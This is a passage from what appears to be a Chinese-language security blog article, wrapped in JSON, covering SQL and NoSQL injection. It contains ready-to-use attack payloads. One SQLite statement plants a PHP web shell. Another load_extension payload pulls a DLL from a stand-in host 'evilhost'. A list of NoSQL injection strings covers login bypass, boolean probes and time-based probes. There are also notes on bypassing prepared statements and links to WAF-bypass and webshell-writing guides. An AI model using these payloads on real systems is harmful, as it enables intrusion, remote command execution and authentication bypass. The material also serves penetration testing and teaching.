punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> lol<span class=\"token punctuation\">.</span>pwn <span class=\"token punctuation\">(</span>dataz<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?system($_GET['</span>cmd<span class=\"token string\">']); ?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span></pre></td></tr></table></figure><p>Load_extension</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_extension<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\evilhost\\evil.dll'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span></pre></td></tr></table></figure><h2 id=\"nosql-payload\"><a class=\"anchor\" href=\"#nosql-payload\">#</a> NoSQL Payload</h2>\n<h3 id=\"常见payload-4\"><a class=\"anchor\" href=\"#常见payload-4\">#</a> 常见 Payload</h3>\n<ul>\n<li>绕过限制条件\n<ul>\n<li><code>&#123;&quot;username&quot;: &quot;user&quot;&#125;</code>  =&gt;  <code>&#123;&quot;username&quot;: &#123;&quot;ne&quot;: &quot;fakeuser&quot;&#125;&#125;</code></li>\n<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>\n</ul>\n</li>\n<li>测试用字符\n<ul>\n<li><code>'&quot;\\/$[].&gt;</code></li>\n</ul>\n</li>\n<li>布尔测试常用\n<ul>\n<li><code>&#123;&quot;$ne&quot;: -1&#125;</code></li>\n<li><code>&#123;&quot;$in&quot;: []&#125;</code></li>\n<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>\n<li><code>&#123;&quot;$or&quot;: [&#123;&#125;,&#123;&quot;foo&quot;:&quot;1&quot;&#125;]&#125;</code></li>\n</ul>\n</li>\n<li>时间\n<ul>\n<li><code>&#123;&quot;$where&quot;: &quot;sleep(100)&quot;&#125;</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"预编译\"><a class=\"anchor\" href=\"#预编译\">#</a> 预编译</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>\n<h2 id=\"模拟预编译\"><a class=\"anchor\" href=\"#模拟预编译\">#</a> 模拟预编译</h2>\n<p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>\n<h2 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h2>\n<h3 id=\"预编译使用错误\"><a class=\"anchor\" href=\"#预编译使用错误\">#</a> 预编译使用错误</h3>\n<p>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>\n<h3 id=\"部分参数不可预编译\"><a class=\"anchor\" href=\"#部分参数不可预编译\">#</a> 部分参数不可预编译</h3>\n<p>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>\n<h3 id=\"预编译实现错误\"><a class=\"anchor\" href=\"#预编译实现错误\">#</a> 预编译实现错误</h3>\n<p>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h1>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=\">sqlmap time based inject 分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp\">SQLInjectionWiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==\">常见数据库写入 Webshell 汇总</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==\">MSSQL 数据库攻击实战指北</span></li>\n</ul>\n<h2 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> Bypass</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==\">SQL 注入 ByPass 的一些小技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4\">Waf Bypass 之道</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ\">MySQL Bypass Wiki</span></li>\n</ul>\n<h2 id=\"nosql\"><a class=\"anchor\" href=\"#nosql\">#</a> NoSQL</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=\">NoSQL 注入的分析和缓解</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==\">NoSQL 注入</span></li>\n</ul>\n<h2 id=\"cheatsheet-2\"><a class=\"anchor\" href=\"#cheatsheet-2\">#</a> Cheatsheet</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=\">MSSQL Pentest Cheatsheet</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "SQL注入"
            ]
        }
    ]
}